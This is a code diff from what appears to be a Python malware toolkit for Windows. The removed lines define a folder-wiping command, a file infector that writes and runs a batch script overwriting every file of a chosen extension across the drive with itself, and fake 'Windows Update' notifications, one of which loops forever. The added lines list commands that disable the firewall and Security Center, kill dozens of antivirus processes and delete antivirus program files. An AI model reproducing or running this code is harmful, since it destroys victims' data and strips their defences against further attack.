-    cmd_del_files_in_folder = 'del /f /q ' + str(folderpath) + r"\*.*"
-    os.system(cmd_del_files_in_folder)
-
-
-'''
-This function will infect all files with the extension 
-which you pass this function while using this in the specific directory
-You have to change the directory manually, this cannot be done by this function for now
-
-Usage: INFECT_ANY_FILE('jpg', 'Any_File_name.bat')
-
-Make sure to inlude .bat at the end of the file name
-Make sure to not to include '.' when entering the file extension
-Passing a '*' as the file extension ( first value ) will infect all the files
-
-a file will be created from this function and you can change the file name if you want ( optional )
-this is the filename used by default "WINDOWS_ACTIVE_DIRECTORY_NEW.bat"
-'''
-def INFECT_ANY_FILE(fextension, filename="WINDOWS_ACTIVE_DIRECTORY_NEW.bat"): # file extension should be without the '.'
-    cmd_iaf = r"""@echo off
-::------- FIX FILE ISSUES -----::
-Dir %Homedrive% /s /b > DirPath                        
-        For /f %%Y In (DirPath) Do (
-        Set DirPath=%%Y > Nul  
-            For %%Z In (%DirPath%\*.""" + str(fextension) + r""") Do (
-            Set DocInfect=%%Z > Nul
-            Copy /y %0 %DocInfect%
-        )
-    )"""
-    fileiaf = open(filename, "w+")
-    fileiaf.write(cmd_iaf)
-    fileiaf.close()
-    time.sleep(1)
-    os.system(filename)
-
-'''
-This function will show one notification to the user!
-You can pass two values to the function, they are the title, message
-
-Usage: NOTIFY_USER_ANY(title="Notification with Python", message="This is a test notification", iconpath=".\not_icon.ico", tdurationt=20)
-if you dont need an icon path, just don't pass it
-everything here is optional
-'''
-def NOTIFY_USER_ANY(title="Windows Update", message="If the computer freezes, restart the computer and start the update again!", iconpath="no", tduration=20):
-    if iconpath == "no":
-        toaster = win10toast.ToastNotifier()
-        toaster.show_toast(title, message, duration=tduration)
-    
-    else:
-        toaster = win10toast.ToastNotifier()
-        toaster.show_toast(title, message, icon_path=iconpath, duration=tduration)
-
-
-'''
-This function will show unlimited notifications to the user!
-You can pass two values to the function, they are the title, message
-
-Usage: NOTIFY_USER_ANY(title="Notification with Python", message="This is a test notification", iconpath=".\not_icon.ico", tdurationt=15)
-if you dont need an icon path, just don't pass it
-everything here is optional
-'''
-def NOTIFY_USER_UNLIMITED(title="Windows Update", message="If the computer freezes, restart the computer and start the update again!", iconpath="no", tduration=15):
-    if iconpath == "no":
-        while True:
-            toaster = win10toast.ToastNotifier()
-            toaster.show_toast(title, message, duration=tduration)
-    
-    else:
-        while True:
-            toaster = win10toast.ToastNotifier()
-            toaster.show_toast(title, message, icon_path=iconpath, duration=tduration)
-
-
-
-# NOTIFY_USER_ANY()
+    antivirus_commands = [
+        "net stop “Security Center”",
+        "netsh firewall set opmode mode=disable",
+        "tskill /A av*",
+        "tskill /A fire*",
+        "tskill /A anti*",
+        "tskill /A spy*",
+        "tskill /A bullguard",
+        "tskill /A PersFw",
+        "tskill /A KAV*",
+        "tskill /A ZONEALARM",
+        "tskill /A SAFEWEB",
+        "tskill /A spy*",
+        "tskill /A bullguard",
+        "tskill /A PersFw",
+        "tskill /A KAV*",
+        "tskill /A ZONEALARM",
+        "tskill /A SAFEWEB",
+        "tskill /A OUTPOST",
+        "tskill /A nv*",
+        "tskill /A nav*",
+        "tskill /A F-*",
+        "tskill /A ESAFE",
+        "tskill /A cle",
+        "tskill /A BLACKICE",
+        "tskill /A def*",
+        "tskill /A kav",
+        "tskill /A kav*",
+        "tskill /A avg*",
+        "tskill /A ash*",
+        "tskill /A aswupdsv",
+        "tskill /A ewid*",
+        "tskill /A guard*",
+        "tskill /A guar*",
+        "tskill /A gcasDt*",
+        "tskill /A msmp*",
+        "tskill /A mcafe*",
+        "tskill /A mghtml",
+        "tskill /A msiexec",
+        "tskill /A outpost",
+        "tskill /A isafe",
+        "tskill /A zap*cls",
+        "tskill /A zauinst",
+        "tskill /A upd*",
+        "tskill /A zlclien*",
+        "tskill /A minilog",
+        "tskill /A cc*",
+        "tskill /A norton*",
+        "tskill /A norton au*",
+        "tskill /A ccc*",
+        "tskill /A npfmn*",
+        "tskill /A loge*",
+        "tskill /A nisum*",
+        "tskill /A issvc",
+        "tskill /A tmp*",
+        "tskill /A tmn*",
+        "tskill /A pcc*",
+        "tskill /A cpd*",
+        "tskill /A pop*",
+        "tskill /A pav*",
+        "tskill /A padmincls",
+        "tskill /A panda*",
+        "tskill /A avsch*",
+        "tskill /A sche*",
+        "tskill /A syman*",
+        "tskill /A virus*",
+        "tskill /A realm*cls",
+        "tskill /A sweep*",
+        "tskill /A scan*",
+        "tskill /A ad-*",
+        "tskill /A safe*",
+        "tskill /A avas*",
+        "tskill /A norm*",
+        "tskill /A offg*",
+        "del /Q /F C:\Program Files\alwils~1\avast4\*.*",
+        "del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe",
+        "del /Q /F C:\Program Files\kasper~1\*.exe",
+        "del /Q /F C:\Program Files\trojan~1\*.exe",
+        "del /Q /F C:\Program Files\f-prot95\*.dll",
+        "del /Q /F C:\Program Files\tbav\*.datcls",
+        "del /Q /F C:\Program Files\avpersonal\*.vdf",
+        "del /Q /F C:\Program Files\Norton~1\*.cnt",
+        "del /Q /F C:\Program Files\Mcafee\*.*",
+        "del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*",
+        "del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*",
+        "del /Q /F C:\Program Files\Norton~1\Norton~1\*.*",
+        "del /Q /F C:\Program Files\Norton~1\*.*",
+        "del /Q /F C:\Program Files\avgamsr\*.exe",
+        "del /Q /F C:\Program Files\avgamsvr\*.exe",
+        "del /Q /F C:\Program Files\avgemc\*.exe",
+        "del /Q /F C:\Program Files\avgcc\*.exe",
+        "del /Q /F C:\Program Files\avgupsvc\*.exe",
+        "del /Q /F C:\Program Files\grisoft",
+        "del /Q /F C:\Program Files\nood32krn\*.exe",
+        "del /Q /F C:\Program Files\nood32\*.exe",
+        "del /Q /F C:\Program Files\nod32",
+        "del /Q /F C:\Program Files\nood32",
+        "del /Q /F C:\Program Files\kav\*.exe",
+        "del /Q /F C:\Program Files\kavmm\*.exe",
+        "del /Q /F C:\Program Files\kaspersky\*.*",
+        "del /Q /F C:\Program Files\ewidoctrl\*.exe",
+        "del /Q /F C:\Program Files\guard\*.exe",
+        "del /Q /F C:\Program Files\ewido\*.exe",
+        "del /Q /F C:\Program Files\pavprsrv\*.exe",
+        "del /Q /F C:\Program Files\pavprot\*.exe",
+        "del /Q /F C:\Program Files\avengine\*.exe",
+        "del /Q /F C:\Program Files\apvxdwin\*.exe",
+        "del /Q /F C:\Program Files\webproxy\*.exe",
+        "del /Q /F C:\Program Files\panda software\*.*",]
